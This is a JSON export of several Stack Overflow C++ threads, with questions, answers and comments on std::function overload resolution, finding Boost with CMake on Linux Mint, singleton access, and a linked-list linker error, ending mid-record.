[{"tags": ["c++", "templates", "c++11", "std", "overloading"], "comments": [{"owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "edited": false, "score": 0, "creation_date": 1429747656, "post_id": 29811071, "comment_id": 47750267, "body": "std::vector&lt;int&gt; cannot be converted to std::vector&lt;float&gt; but int can be implicitly converted to float"}, {"owner": {"reputation": 19441, "user_id": 1381108, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a55e1b257487441cd435f66bfb413f1?s=128&d=identicon&r=PG", "display_name": "Rapptz", "link": "https://stackoverflow.com/users/1381108/rapptz"}, "edited": false, "score": 1, "creation_date": 1429747726, "post_id": 29811071, "comment_id": 47750300, "body": "<code>static_cast&lt;void(*)(int)&gt;(&amp;Print)</code>"}, {"owner": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "reply_to_user": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "edited": false, "score": 0, "creation_date": 1429747738, "post_id": 29811071, "comment_id": 47750305, "body": "@Sarang ok, well if I use completely different types that can&#39;t be implicitly converted, I think the problem still remains."}], "answers": [{"comments": [{"owner": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "edited": false, "score": 0, "creation_date": 1429747874, "post_id": 29811238, "comment_id": 47750355, "body": "Did my issue have to do with ints being implicitly converted to a float, or would this happen with any two types?"}], "tags": [], "owner": {"reputation": 839, "user_id": 1135979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59464968f70aff62c07a7da3a0f6ba80?s=128&d=identicon&r=PG", "display_name": "yachoor", "link": "https://stackoverflow.com/users/1135979/yachoor"}, "is_accepted": false, "score": 3, "last_activity_date": 1429747788, "creation_date": 1429747788, "answer_id": 29811238, "question_id": 29811071, "link": "https://stackoverflow.com/questions/29811071/why-cant-the-compiler-resolve-an-overload-of-a-stdfunction-parameter/29811238#29811238", "title": "Why can&#39;t the compiler resolve an overload of a std::function parameter?", "body": "<p>You can assign both functions to <code>std::function&lt;void(int)&gt;</code> as both can be called with an int.</p>\n\n<p>To force selecting correct overload with int version: <code>Print_Wrapper(static_cast&lt;void(*)(int)&gt;(Print));</code></p>\n"}, {"comments": [{"owner": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "edited": false, "score": 0, "creation_date": 1429747926, "post_id": 29811240, "comment_id": 47750376, "body": "Are you saying my example would work for C++14?"}, {"owner": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "edited": false, "score": 0, "creation_date": 1429748081, "post_id": 29811240, "comment_id": 47750425, "body": "This solution works.  Without the cast, it still didn&#39;t work in C++14."}, {"owner": {"reputation": 8889, "user_id": 4538344, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/746edd669e07914179feb9f6957a06e3?s=128&d=identicon&r=PG", "display_name": "StenSoft", "link": "https://stackoverflow.com/users/4538344/stensoft"}, "reply_to_user": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "edited": false, "score": 0, "creation_date": 1429749593, "post_id": 29811240, "comment_id": 47750922, "body": "Hmm, originally I though it should work in C++14 but after careful examination of <a href=\"https://cplusplus.github.io/LWG/lwg-defects.html#2132\" rel=\"nofollow noreferrer\">LWG 2132</a>, the issue is present even in C++14 because both can be called with <code>int</code>."}, {"owner": {"reputation": 233737, "user_id": 1774667, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/b6516fec2c5997b867545d285304cf12?s=128&d=identicon&r=PG", "display_name": "Yakk - Adam Nevraumont", "link": "https://stackoverflow.com/users/1774667/yakk-adam-nevraumont"}, "edited": false, "score": 0, "creation_date": 1429753998, "post_id": 29811240, "comment_id": 47752262, "body": "There is no easy way to say &quot;this conversion is a preferred user-defined conversion to some other conversion&quot; as far as I can tell.  Maybe with an unused varargs pack?  Seems dirty."}, {"owner": {"reputation": 8889, "user_id": 4538344, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/746edd669e07914179feb9f6957a06e3?s=128&d=identicon&r=PG", "display_name": "StenSoft", "link": "https://stackoverflow.com/users/4538344/stensoft"}, "edited": false, "score": 0, "creation_date": 1429777658, "post_id": 29811240, "comment_id": 47762369, "body": "It is possible to prefer non-converting functions by declaring overloaded version of <code>Print_Wrapper</code>: <code>void Print_Wrapper(void(*func)(int)) { Print_Wrapper(std::function&lt;void(int)&gt;(func)); }</code>"}], "tags": [], "owner": {"reputation": 8889, "user_id": 4538344, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/746edd669e07914179feb9f6957a06e3?s=128&d=identicon&r=PG", "display_name": "StenSoft", "link": "https://stackoverflow.com/users/4538344/stensoft"}, "is_accepted": true, "score": 5, "last_activity_date": 1429749655, "last_edit_date": 1429749655, "creation_date": 1429747804, "answer_id": 29811240, "question_id": 29811071, "link": "https://stackoverflow.com/questions/29811071/why-cant-the-compiler-resolve-an-overload-of-a-stdfunction-parameter/29811240#29811240", "title": "Why can&#39;t the compiler resolve an overload of a std::function parameter?", "body": "<p>In C++11, <code>std::function</code>'s constructor can take any callable object, even when that is ill-formed and it cannot call the object. In C++14, overload resolution is fixed but both functions can be called with <code>int</code> so both are valid candidates.</p>\n\n<p>You need to explicitely request the correct function:</p>\n\n<pre><code>Print_Wrapper(static_cast&lt;void(*)(int)&gt;(Print))\n</code></pre>\n"}], "owner": {"reputation": 31438, "user_id": 908939, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/etRsI.jpg?s=128&g=1", "display_name": "Trevor Hickey", "link": "https://stackoverflow.com/users/908939/trevor-hickey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1741, "favorite_count": 0, "closed_date": 1429747816, "accepted_answer_id": 29811240, "answer_count": 2, "score": 0, "last_activity_date": 1429749655, "creation_date": 1429746892, "last_edit_date": 1429747481, "question_id": 29811071, "link": "https://stackoverflow.com/questions/29811071/why-cant-the-compiler-resolve-an-overload-of-a-stdfunction-parameter", "closed_reason": "Duplicate", "title": "Why can&#39;t the compiler resolve an overload of a std::function parameter?", "body": "<p>Observe the following example:  </p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;functional&gt;\n#include &lt;cstdlib&gt;\n\nvoid Print_Wrapper(std::function&lt;void(int)&gt; function);\nvoid Print(int param);\n\nint main(){\n\n  Print_Wrapper(Print);\n\n  return EXIT_SUCCESS;\n}\n\nvoid Print_Wrapper(std::function&lt;void(int)&gt; function){\n  int i = 5;\n  function(i);\n}\nvoid Print(int param){\n  std::cout &lt;&lt; param &lt;&lt; std::endl;\n}\n</code></pre>\n\n<p>This works correctly, and prints <code>5</code>.  </p>\n\n<hr>\n\n<p>Now look at the same example with an overloaded function added:  </p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;functional&gt;\n#include &lt;cstdlib&gt;\n\nvoid Print_Wrapper(std::function&lt;void(int)&gt; function);\nvoid Print(int param);\nvoid Print(float param);\n\nint main(){\n\n  Print_Wrapper(Print);\n\n  return EXIT_SUCCESS;\n}\n\nvoid Print_Wrapper(std::function&lt;void(int)&gt; function){\n  int i = 5;\n  function(i);\n}\nvoid Print(int param){\n  std::cout &lt;&lt; param &lt;&lt; std::endl;\n}\nvoid Print(float param){\n  std::cout &lt;&lt; param &lt;&lt; std::endl;\n}\n</code></pre>\n\n<p>This gives the following compiler error:  </p>\n\n<blockquote>\n  <p>main.cpp:11:22: error: cannot resolve overloaded function \u2018Print\u2019\n  based on conversion to type \u2018std::function\u2019<br>\n  Print_Wrapper(Print);</p>\n</blockquote>\n\n<p>Could some explain why the compiler can't resolve the overload?<br>\n<code>Print_Wrapper</code> only expects an int function-- the float function shouldn't even be considered.  </p>\n\n<hr>\n\n<p>Additionally, what should I do to fix this?  </p>\n\n<p>I recall problems like this occurring if a <code>typename</code> or something was left out, but then that would require me to make <code>Print_Wrapper</code> a template.<br>\nDoes <code>Print_Wrapper</code> need to be a function template?  </p>\n\n<p>I guess I'm use to functionality similar to this, that just works.  For example:  </p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;cstdlib&gt;\n\nvoid Print_Wrapper(std::vector&lt;int&gt; param);\nvoid Print(std::vector&lt;int&gt; param);\nvoid Print(std::vector&lt;float&gt; param);\n\nint main(){\n\n  std::vector&lt;int&gt; vi{1,2,3};\n  std::vector&lt;float&gt; vf{1.0,2.0,3.0};\n\n  Print(vi); //prints int\n  Print(vf); //prints float\n\n  Print_Wrapper(vi); //prints int (no overload issue)\n  Print_Wrapper(vf); //compiler error (as expected)\n\n  return EXIT_SUCCESS;\n}\n\nvoid Print_Wrapper(std::vector&lt;int&gt; param){\n  Print(param);\n  return;\n}\nvoid Print(std::vector&lt;int&gt; param){\n  std::cout &lt;&lt; \"int\" &lt;&lt; std::endl;\n}\nvoid Print(std::vector&lt;float&gt; param){\n  std::cout &lt;&lt; \"float\" &lt;&lt; std::endl;\n}\n</code></pre>\n\n<p>So I think the issue lies somewhere in the lookup rules of an actual C++ function, as this example only uses types.  Thoughts?  </p>\n"}, {"tags": ["c++", "linux", "boost", "compilation", "cmake"], "comments": [{"owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "edited": false, "score": 0, "creation_date": 1429746573, "post_id": 29810979, "comment_id": 47749904, "body": "What specific version of CMake are you using?"}], "answers": [{"comments": [{"owner": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429746972, "post_id": 29811043, "comment_id": 47750033, "body": "OK, but would that work on my partner&#39;s computer, or would they have to remove that on their end? Theirs is installed just to /user/lib/"}, {"owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "reply_to_user": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429747101, "post_id": 29811043, "comment_id": 47750079, "body": "The best way to handle that is to have a project level option that lets you set <code>BOOST_LIBRARYDIR</code>."}, {"owner": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429747665, "post_id": 29811043, "comment_id": 47750273, "body": "do you mean      set(BOOST_LIB_DIR /usr/lib/x86_64-linux-gnu)"}, {"owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "reply_to_user": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429747667, "post_id": 29811043, "comment_id": 47750274, "body": "Disregard my comment above, there&#39;s no need for a project level option. Variables set on the command line are automatically used in the find modules."}, {"owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "reply_to_user": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429747743, "post_id": 29811043, "comment_id": 47750308, "body": "No, <code>BOOST_LIB_DIR</code> is not used at all by the find module. You have to set <code>BOOST_LIBRARYDIR</code>. If you inspect the source you&#39;ll see what&#39;s going on."}, {"owner": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429747770, "post_id": 29811043, "comment_id": 47750321, "body": "How do the larger projects do it? I do not have problems compiling those when they use CMake (well, not finding boost anyway...)"}, {"owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "reply_to_user": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "edited": false, "score": 0, "creation_date": 1429748252, "post_id": 29811043, "comment_id": 47750484, "body": "There are many ways of changing where libraries are searched for. It&#39;s possible those projects do something like set <code>CMAKE_LIBRARY_PATH</code>. You can find more useful variables in the aptly named <a href=\"http://www.cmake.org/Wiki/CMake_Useful_Variables#Environment_Variables\" rel=\"nofollow noreferrer\">CMake Use Variables</a> wiki page."}], "tags": [], "owner": {"reputation": 5834, "user_id": 2297365, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4179be309867f97cb08385c9338c436?s=128&d=identicon&r=PG", "display_name": "huu", "link": "https://stackoverflow.com/users/2297365/huu"}, "is_accepted": true, "score": 2, "last_activity_date": 1429747567, "last_edit_date": 1429747567, "creation_date": 1429746780, "answer_id": 29811043, "question_id": 29810979, "link": "https://stackoverflow.com/questions/29810979/cannot-find-boost-with-cmake-on-linux-mint/29811043#29811043", "title": "Cannot find boost with CMake on Linux Mint", "body": "<p>You can set the hint <code>BOOST_LIBRARYDIR</code>:</p>\n\n<pre><code>set(BOOST_LIBRARYDIR \"/usr/lib/x86_64-linux-gnu\")\nfind_package(Boost 1.55.0 COMPONENTS unit_test_framework thread log REQUIRED)\n</code></pre>\n\n<p>Alternative, you can set this when running CMake like this:</p>\n\n<pre><code>cmake -DBOOST_LIBRARYDIR=\"/usr/lib/x86_64-linux-gnu\" &lt;project_root&gt;\n</code></pre>\n\n<p>If you just run:</p>\n\n<pre><code>cmake &lt;project_root&gt;\n</code></pre>\n\n<p>then <code>FindBoost.cmake</code> will look in the usual spots for your boost libaries.</p>\n\n<p>See the documentation of <code>FindBoost.cmake</code> for your CMake version <a href=\"https://github.com/Kitware/CMake/blob/v2.8.12.2/Modules/FindBoost.cmake#L30-L33\" rel=\"nofollow\">here</a>.</p>\n"}], "owner": {"reputation": 112, "user_id": 4404257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/51a5b1f67723ecf3d39704d89e608295?s=128&d=identicon&r=PG&f=1", "display_name": "Eadword", "link": "https://stackoverflow.com/users/4404257/eadword"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1895, "favorite_count": 0, "accepted_answer_id": 29811043, "answer_count": 1, "score": 1, "last_activity_date": 1429747567, "creation_date": 1429746404, "question_id": 29810979, "link": "https://stackoverflow.com/questions/29810979/cannot-find-boost-with-cmake-on-linux-mint", "title": "Cannot find boost with CMake on Linux Mint", "body": "<p>I have been working on a library in C++ and have run into a bit of difficulty trying to integrate boost into my project. I kept the message that boost could not be found, but on the other hand, my fellow developer using Arch had no issues.</p>\n\n<p>We figured out that this is because Linux Mint (at least with the libboost-all-dev package) installs the libraries to /usr/lib/x86_64-linux-gnu which is not searched by the FindBoost module. We fixed this by creating symbolic links:</p>\n\n<pre><code>ln -s /usr/lib/x86_64-linux-gnu/libboost* /usr/lib/\n</code></pre>\n\n<p>What I want to know: is there a better (more acceptable) way of fixing this because when I compile major projects, I do not run into this problem.</p>\n\n<p>Here is CMakeLists.txt (with some omissions)</p>\n\n<pre><code>cmake_minimum_required(VERSION 2.8)\nproject(testlibrary CXX)\n\nset(CMAKE_CXX_FLAGS \"-std=c++0x ${CMAKE_CXX_FLAGS}\")\n\nset(Boost_USE_STATIC_LIBS ON)\nset(Boost_USE_MULTITHREADED OFF)\nset(Boost_USE_STATIC_RUNTIME OFF)\n\nfind_package(Boost 1.55.0 COMPONENTS unit_test_framework thread log REQUIRED)\n\ninclude_directories(${Boost_INCLUDE_DIRS})\n\nadd_library(testlibrary STATIC ${SOURCE_MAIN})\n\ntarget_link_libraries(testlibrary ${Boost_LIBRARIES})\n</code></pre>\n"}, {"tags": ["c++", "singleton"], "comments": [{"owner": {"reputation": 13014, "user_id": 4140572, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/2uRSa.png?s=128&g=1", "display_name": "Angel Angel", "link": "https://stackoverflow.com/users/4140572/angel-angel"}, "edited": false, "score": 0, "creation_date": 1429748222, "post_id": 29810918, "comment_id": 47750466, "body": "you might want to look at this <a href=\"http://silviuardelean.ro/2012/06/05/few-singleton-approaches/\" rel=\"nofollow noreferrer\">silviuardelean.ro/2012/06/05/few-singleton-approaches</a>"}], "answers": [{"comments": [{"owner": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 0, "creation_date": 1429746311, "post_id": 29810941, "comment_id": 47749827, "body": "Not worked. Compiler generated error &#39;singleton&#39; declared as reference but not initialized and several others on Singleton code..."}, {"owner": {"reputation": 839, "user_id": 1135979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59464968f70aff62c07a7da3a0f6ba80?s=128&d=identicon&r=PG", "display_name": "yachoor", "link": "https://stackoverflow.com/users/1135979/yachoor"}, "reply_to_user": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 0, "creation_date": 1429746733, "post_id": 29810941, "comment_id": 47749955, "body": "@Mendez You need to declare it and initialize in the same expression like in the code above"}, {"owner": {"reputation": 2827, "user_id": 3931225, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/46nwm.gif?s=128&g=1", "display_name": "KompjoeFriek", "link": "https://stackoverflow.com/users/3931225/kompjoefriek"}, "edited": false, "score": 1, "creation_date": 1429746815, "post_id": 29810941, "comment_id": 47749984, "body": "I&#39;m using the exact same <code>Singleton</code> in my own code all the time, it should work. But i prefer to access it like @Christian (and with a <code>dot</code> instead of <code>-&gt;</code>)"}, {"owner": {"reputation": 2827, "user_id": 3931225, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/46nwm.gif?s=128&g=1", "display_name": "KompjoeFriek", "link": "https://stackoverflow.com/users/3931225/kompjoefriek"}, "reply_to_user": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 0, "creation_date": 1429747394, "post_id": 29810941, "comment_id": 47750182, "body": "@Mendez Please see that my answer does work in this online example: <a href=\"http://goo.gl/B9Ws4P\" rel=\"nofollow noreferrer\">goo.gl/B9Ws4P</a>"}], "tags": [], "owner": {"reputation": 2827, "user_id": 3931225, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/46nwm.gif?s=128&g=1", "display_name": "KompjoeFriek", "link": "https://stackoverflow.com/users/3931225/kompjoefriek"}, "is_accepted": false, "score": 1, "last_activity_date": 1429746170, "creation_date": 1429746170, "answer_id": 29810941, "question_id": 29810918, "link": "https://stackoverflow.com/questions/29810918/correct-way-to-call-a-singleton-object-in-c/29810941#29810941", "title": "Correct way to call a singleton object in C++", "body": "<p>You want to store a reference to your singleton, not a pointer.</p>\n\n<pre><code>Singleton&amp; my_singleton = Singleton::getInstance();\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 0, "creation_date": 1429746931, "post_id": 29810989, "comment_id": 47750022, "body": "Doesn&#180;work and doesn&#180;t make sense that I cannot store it in a variable...I need to fix howto store it in a variable, not to avoid it..."}, {"owner": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 0, "creation_date": 1429747281, "post_id": 29810989, "comment_id": 47750142, "body": "Actually this gave me a hint on how to solve it... Singleton&amp; my_singleton = Singleton::getInstance(); then my_singleton.getMessage(&quot;a&quot;);"}, {"owner": {"reputation": 7089, "user_id": 2852165, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/JwDJG.jpg?s=128&g=1", "display_name": "SHR", "link": "https://stackoverflow.com/users/2852165/shr"}, "reply_to_user": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "edited": false, "score": 2, "creation_date": 1429747470, "post_id": 29810989, "comment_id": 47750207, "body": "@Mendez no need the reference: just type it as: <code>Singleton::getInstance().getMessage(&quot;a&quot;);</code> if you want to short it use a macro: <code>#define theSingleton Singleton::getInstance()</code> and use it with the macro:  <code>theSingleton.getMessage(&quot;a&quot;);</code>"}], "tags": [], "owner": {"reputation": 5409, "user_id": 480386, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hKe7X.jpg?s=128&g=1", "display_name": "Christian Abella", "link": "https://stackoverflow.com/users/480386/christian-abella"}, "is_accepted": true, "score": 5, "last_activity_date": 1429747500, "last_edit_date": 1429747500, "creation_date": 1429746467, "answer_id": 29810989, "question_id": 29810918, "link": "https://stackoverflow.com/questions/29810918/correct-way-to-call-a-singleton-object-in-c/29810989#29810989", "title": "Correct way to call a singleton object in C++", "body": "<p>what about you just call the function like this:</p>\n\n<pre><code>Singleton::getInstance().getMessage(\"a\");\n</code></pre>\n\n<p>instead of assigning it to a variable.</p>\n"}], "owner": {"reputation": 13626, "user_id": 2697571, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/cefd29d899fd6175ce401961e209a2a8?s=128&d=identicon&r=PG&f=1", "display_name": "Mendes", "link": "https://stackoverflow.com/users/2697571/mendes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3301, "favorite_count": 1, "accepted_answer_id": 29810989, "answer_count": 2, "score": 0, "last_activity_date": 1429821602, "creation_date": 1429746041, "last_edit_date": 1495540924, "question_id": 29810918, "link": "https://stackoverflow.com/questions/29810918/correct-way-to-call-a-singleton-object-in-c", "title": "Correct way to call a singleton object in C++", "body": "<p>I've build a singleton class based on the hit <a href=\"https://stackoverflow.com/questions/1008019/c-singleton-design-pattern\">posted here</a>.</p>\n\n<p>I've extended it with a <code>getMessage()</code> function, that will retrive an internal dictionary message - the dictionary needs to be loaded only once on the whole application, that is the reason of the singleton.</p>\n\n<p>My code:</p>\n\n<p><strong>Singleton.hpp</strong></p>\n\n<pre><code>class Singleton {\n\npublic:\n\n    static Singleton&amp; getInstance();\n    std::string getMessage(std::string code);\n\nprivate:\n\n    Singleton() {}; \n    Singleton(Singleton const&amp;) = delete;\n    void operator=(Singleton const&amp;) = delete;\n};\n</code></pre>\n\n<p><strong>Singleton.cpp</strong></p>\n\n<pre><code>Singleton&amp; Singleton::getInstance()\n{\n    static Singleton instance;\n    return instance;\n}\n\n\nstd::string Singleton::getMessage(std::string code)\n{\n    /// Do something\n    return \"Code example.\";\n}\n</code></pre>\n\n<p>And the main code:</p>\n\n<p><strong>main.cpp</strong></p>\n\n<pre><code>int main()\n{\n        Singleton* my_singleton;\n        my_singleton = Singleton::getInstance(); **&lt;-- ERROR HERE**\n\n        cout &lt;&lt; my_singleton-&gt;getMessage(\"a\"); &lt;&lt; endl\n\n}\n</code></pre>\n\n<p>Main is giving me an error: <code>Cannot convert 'Singleton' to 'Singleton*' in assignment</code></p>\n\n<p>What is the correct way to \"instantiate\" the singleton and make use of the getMessage function.</p>\n\n<p>Thanks a lot for helping...</p>\n"}, {"tags": ["c++", "list", "pointers"], "comments": [{"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "edited": false, "score": 1, "creation_date": 1429747467, "post_id": 29810913, "comment_id": 47750206, "body": "side remark: replace <code>system(&quot;pause&quot;)</code> by the portable <code>std::cin.get();</code>. Not everyone runs Windows."}, {"owner": {"reputation": 818, "user_id": 537089, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/deb07d538afab86e85877e7f787c2fe8?s=128&d=identicon&r=PG", "display_name": "markbratanov", "link": "https://stackoverflow.com/users/537089/markbratanov"}, "reply_to_user": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "edited": false, "score": 0, "creation_date": 1429748844, "post_id": 29810913, "comment_id": 47750678, "body": "@vsoftco thanks, will do."}], "answers": [{"comments": [{"owner": {"reputation": 818, "user_id": 537089, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/deb07d538afab86e85877e7f787c2fe8?s=128&d=identicon&r=PG", "display_name": "markbratanov", "link": "https://stackoverflow.com/users/537089/markbratanov"}, "edited": false, "score": 0, "creation_date": 1429748448, "post_id": 29810921, "comment_id": 47750533, "body": "Doing the first (moving <code>void NumberList::appendNode(double num) {}</code> to just above our int main in our implemented cpp file, returns the following error, <code>Error\t1\terror LNK2019: unresolved external symbol &quot;public: __thiscall NumberList::~NumberList(void)&quot; (??1NumberList@@QAE@XZ) referenced in function _main</code>"}, {"owner": {"reputation": 818, "user_id": 537089, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/deb07d538afab86e85877e7f787c2fe8?s=128&d=identicon&r=PG", "display_name": "markbratanov", "link": "https://stackoverflow.com/users/537089/markbratanov"}, "edited": false, "score": 0, "creation_date": 1429748587, "post_id": 29810921, "comment_id": 47750590, "body": "The new code with suggested edits: <a href=\"https://gist.github.com/markbratanov/b73278a7d2573ac1ffd9\" rel=\"nofollow noreferrer\">gist.github.com/markbratanov/b73278a7d2573ac1ffd9</a>"}, {"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": 